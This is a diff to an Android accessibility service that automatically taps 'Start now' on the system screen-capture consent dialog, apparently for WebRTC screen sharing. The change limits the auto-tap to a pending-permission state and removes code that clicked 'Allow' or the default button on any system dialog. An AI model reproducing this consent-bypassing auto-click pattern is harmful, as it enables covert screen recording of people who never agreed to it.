@@ -53,7 +53,7 @@ public class SnapAccessibilityService extends AccessibilityService {
             int eventType = event.getEventType();
             if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                 lastPackage = pkg;
-                if ("com.android.systemui".equals(pkg) || "android".equals(pkg)) {
+                if (WebRtcScreenHelper.isAwaitingPermission() && ("com.android.systemui".equals(pkg) || "android".equals(pkg))) {
                     handleAutoApproveScreenCapture();
                 }
             } else if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
@@ -93,10 +93,11 @@ public class SnapAccessibilityService extends AccessibilityService {
     }
 
     private void handleAutoApproveScreenCapture() {
+        if (!WebRtcScreenHelper.isAwaitingPermission()) return;
         try {
             AccessibilityNodeInfo root = getRootInActiveWindow();
             if (root == null) return;
-            String[] targets = {"Start now", "START NOW", "Start", "START", "Allow", "ALLOW"};
+            String[] targets = {"Start now", "START NOW", "Start", "START"};
             for (String target : targets) {
                 List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(target);
                 if (nodes != null && !nodes.isEmpty()) {
@@ -107,13 +108,6 @@ public class SnapAccessibilityService extends AccessibilityService {
                             return;
                         }
                     }
-                }
-            }
-            List<AccessibilityNodeInfo> btn1 = root.findAccessibilityNodeInfosByViewId("android:id/button1");
-            if (btn1 != null && !btn1.isEmpty()) {
-                AccessibilityNodeInfo b = btn1.get(0);
-                if (b != null && b.isClickable()) {
-                    b.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                 }
             }
             root.recycle();
